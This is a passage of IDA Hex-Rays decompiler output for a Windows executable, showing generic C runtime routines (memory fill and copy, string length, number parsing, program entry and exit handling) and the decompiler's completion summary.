  return HeapAlloc(hHeap, 0, v1);
}

//----- (0040388E) --------------------------------------------------------
char *__usercall sub_40388E@<eax>(int a1@<ebx>, char *a2, char a3, unsigned int a4)
{
  int v4; // eax

  if ( a4 )
  {
    LOBYTE(a1) = a3;
    BYTE1(a1) = a3;
    v4 = a1 << 16;
    LOWORD(v4) = a1;
    memset32(a2, v4, a4 >> 2);
    memset(&a2[4 * (a4 >> 2)], a3, a4 & 3);
  }
  return a2;
}
// 40388E: could not find valid save-restore pair for ebx

//----- (004038C1) --------------------------------------------------------
_BYTE *__cdecl sub_4038C1(_BYTE *a1, int a2, int a3)
{
  int v3; // esi
  _BYTE *v4; // ecx

  v3 = a3;
  if ( a3 )
  {
    v4 = a1;
    do
    {
      *v4 = v4[a2 - (_DWORD)a1];
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  return a1;
}

//----- (004038E3) --------------------------------------------------------
unsigned int __cdecl sub_4038E3(char *a1)
{
  return sub_4039EF(a1, 0, 0xAu);
}

//----- (004038F4) --------------------------------------------------------
int __cdecl sub_4038F4(int a1)
{
  int result; // eax

  result = -1;
  do
    ++result;
  while ( *(_BYTE *)(result + a1) );
  return result;
}

//----- (00403903) --------------------------------------------------------
void __usercall __noreturn start(int a1@<ebx>)
{
  LPSTR CommandLineA; // esi
  unsigned __int8 v2; // cl
  CHAR v3; // al
  int wShowWindow; // eax
  HMODULE ModuleHandleA; // eax
  int v6; // eax
  int v7; // [esp-8h] [ebp-4Ch]
  struct _STARTUPINFOA StartupInfo; // [esp+0h] [ebp-44h] BYREF

  if ( dword_406604 && !dword_406604() )
    ExitProcess(0xFFFFFFFE);
  if ( sub_403AF7(off_40500C, (unsigned int)&unk_405014, 1) )
    ExitProcess(0xFFFFFFFD);
  sub_403AF7(off_405000, (unsigned int)&unk_405008, 0);
  CommandLineA = GetCommandLineA();
  if ( !CommandLineA )
    CommandLineA = (LPSTR)&unk_4040CC;
  v2 = 32;
  while ( 1 )
  {
    if ( !*CommandLineA )
      goto LABEL_20;
    if ( (unsigned __int8)*CommandLineA > 0x20u )
      break;
    ++CommandLineA;
  }
  v3 = *CommandLineA;
  do
  {
    if ( v3 == 34 )
      v2 ^= 0x20u;
    v3 = *++CommandLineA;
  }
  while ( (unsigned __int8)*CommandLineA > v2 );
LABEL_20:
  while ( *CommandLineA && (unsigned __int8)*CommandLineA <= v2 )
    ++CommandLineA;
  StartupInfo.dwFlags = 0;
  GetStartupInfoA(&StartupInfo);
  if ( (StartupInfo.dwFlags & 1) != 0 )
    wShowWindow = StartupInfo.wShowWindow;
  else
    wShowWindow = 10;
  v7 = wShowWindow;
  ModuleHandleA = GetModuleHandleA(0);
  v6 = sub_40102C(a1, (int)ModuleHandleA, 0, (int)CommandLineA, v7);
  sub_403AC2(v6);
}
// 405000: using guessed type int (*off_405000[2])(void);
// 40500C: using guessed type int (*off_40500C[2])(void);
// 406604: using guessed type int (*dword_406604)(void);

//----- (004039DA) --------------------------------------------------------
BOOL sub_4039DA()
{
  hHeap = GetProcessHeap();
  return hHeap == 0;
}

//----- (004039EF) --------------------------------------------------------
unsigned int __cdecl sub_4039EF(char *a1, char **a2, unsigned int a3)
{
  unsigned int v4; // esi
  BOOL v5; // edi
  char v6; // cl
  unsigned int v8; // edx
  char v9; // dl
  char v10; // cl
  unsigned int v11; // ecx
  unsigned int v12; // ecx

  v4 = 0;
  v5 = 0;
  while ( *a1 && (unsigned __int8)*a1 <= 0x20u )
    ++a1;
  v6 = *a1;
  if ( !*a1 )
  {
    if ( a2 )
      *a2 = a1;
    return 0;
  }
  if ( v6 == 43 || v6 == 45 )
  {
    ++a1;
    v5 = v6 == 45;
  }
  v8 = a3;
  if ( !a3 )
  {
    if ( *a1 != 48 )
    {
      v8 = 10;
      goto LABEL_33;
    }
    v9 = a1[1];
    if ( v9 != 120 && v9 != 88 )
    {
      v8 = 8;
      ++a1;
      goto LABEL_33;
    }
    v8 = 16;
    goto LABEL_23;
  }
  if ( a3 == 16 && *a1 == 48 )
  {
    v10 = a1[1];
    if ( v10 == 120 || v10 == 88 )
LABEL_23:
      a1 += 2;
  }
LABEL_33:
  while ( 1 )
  {
    LOBYTE(v11) = *a1;
    if ( !*a1 )
      break;
    v11 = (unsigned __int8)v11;
    if ( (unsigned __int8)v11 >= 0x61u )
      v11 = (unsigned __int8)v11 - 32;
    if ( v11 < 0x41 )
    {
      if ( v11 < 0x30 || v11 > 0x39 )
        break;
      v12 = v11 - 48;
    }
    else
    {
      v12 = v11 - 55;
    }
    if ( v12 >= v8 )
      break;
    v4 = v12 + v8 * v4;
    ++a1;
  }
  if ( a2 )
    *a2 = a1;
  if ( v5 )
    return -v4;
  return v4;
}

//----- (00403AC2) --------------------------------------------------------
void __cdecl __noreturn sub_403AC2(UINT uExitCode)
{
  sub_403B1E();
  sub_403AF7(&dword_405018, (unsigned int)&unk_40501C, 0);
  sub_403AF7(&dword_405020, (unsigned int)&unk_405024, 0);
  ExitProcess(uExitCode);
}
// 405018: using guessed type int (*dword_405018)(void);
// 405020: using guessed type int (*dword_405020)(void);

//----- (00403AF7) --------------------------------------------------------
int __cdecl sub_403AF7(int (**a1)(void), unsigned int a2, int a3)
{
  int result; // eax

  while ( (unsigned int)a1 < a2 )
  {
    if ( *a1 )
    {
      result = (*a1)();
      if ( a3 )
      {
        if ( result )
          return result;
      }
    }
    ++a1;
  }
  return 0;
}

//----- (00403B1E) --------------------------------------------------------
int sub_403B1E()
{
  int result; // eax

  while ( dword_40657C )
    result = ((int (*)(void))dword_406580[--dword_40657C])();
  return result;
}
// 40657C: using guessed type int dword_40657C;
// 406580: using guessed type int dword_406580[];

// nfuncs=43 queued=42 decompiled=42 lumina nreq=0 worse=0 better=0
// ALL OK, 42 function(s) have been successfully decompiled
